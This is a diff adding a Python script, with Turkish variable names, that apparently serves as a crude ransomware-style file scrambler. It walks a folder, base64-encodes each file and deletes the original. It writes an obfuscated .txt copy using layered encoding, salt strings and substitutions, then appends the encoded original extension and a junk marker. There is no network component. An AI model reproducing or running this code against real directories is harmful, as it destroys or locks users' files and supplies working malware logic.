@@ -1,0 +1,68 @@
+import base64
+import os
+import datetime
+start_time = datetime.datetime.now()
+harfler=["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","R","S","T","U","V","Y","Z","W","Q","X","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","r","s","t","u","v","y","z","w","q","x","0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F"]
+liste = []
+files = []
+
+'''
+os.startfile("/Users/erdiakkilic/Desktop/isyan.txt")    
+'''
+for r, d, fa in os.walk('/Users/erdi/Desktop/deneme/'):
+    for file in fa:
+        files.append(os.path.join(r, file))
+for f in files:
+    if (f.index(".")!=-1):
+        print(f)
+        index = f.index(".")
+        uzunluk = len(f) #
+        uzantı = f[index + 1:uzunluk]
+        dosyaOkuma = open(f, 'rb').read()
+        dosyaEncode = base64.b64encode(dosyaOkuma).decode('UTF-8')
+        os.remove(f)
+        f=(os.path.splitext(f)[0]+'.txt')
+        with open(f, "w") as file:
+            file.write(str(dosyaEncode))
+        with open(f, "r") as fa:
+            liste = [i for i in fa.readlines() if i is not None or len(str(i).strip()) > 0]
+        with open(f, "w") as fa:
+            for x in liste:
+                string = "SecureSpace" + x + "CoManChe"
+                encoded = string.encode()
+                sifreleyici = base64.b64encode(encoded)
+                mesaj = sifreleyici.decode()
+                a = "VeBuzshe" + mesaj
+                encoded2 = a.encode()
+                sifreleyici2 = base64.b64encode(encoded2)
+                mesaj = sifreleyici2.decode()
+                x = x.replace(x, mesaj)
+                x = x.replace("sxVMl56UVE3kU", "kj56YtbdAWZ")
+                x = x.replace("VmVCdXpzaGV", "SaX71aKHVdrasx")
+                x = x.replace("xVMl56UVE3kUT", "AS2kJHGbgy452Bn")
+                x = x.replace("llXNURhR1U9", "Akl97ktrB2")
+                x = x.replace("ZqZFhKbFUzQmhZMlVL", "56UVE3k")
+                x = x.replace("==", "X21cayIBTp912Q")
+                x = x.replace("=", "21WvzwCsa2GFeA29")
+
+                '''''
+                uzunluk = len(x) % 7  # her satırın uzunluğunun mod 7sini alarak kalan sonuc kadar ters sezar şifreleme yapıyoruz
+              
+                for harf in x:
+                    for sayi in range(len(harfler)):
+                        if harf == harfler[sayi]:
+                            fa.write(harfler[sayi - uzunluk - 1])
+                            break
+                '''''
+
+                fa.write(x)
+                uzantu=uzantı
+                encodedUzantu = uzantu.encode()
+                sifreleyiciUzantu = base64.b64encode(encodedUzantu)
+                SifreliUzantu = sifreleyiciUzantu.decode()
+                fa.writelines("523xa341spouUYVXAs2CmnCh3"+SifreliUzantu+"521çSX4231xlXyuTC124gSYXgfsYsLfPXXa2EDnMKFL3RWi3KxDrTlO"
+                                              "SOS30UxOQaq7EPknSO18qTDa2cTSuTWVhKl9HUxVpKTjpTjVJKDH2YTTmQDpSlHMkPDGyRxTiaD0"
+                                              "CYhHSXYwUyThLVKqH34uV56Y3EcT4WfVQjivYjaa24xQxHGZjTLQvf0SkxYO0OGaEjTkqwYsxLB")
+
+end_time = datetime.datetime.now()
+print(end_time - start_time)
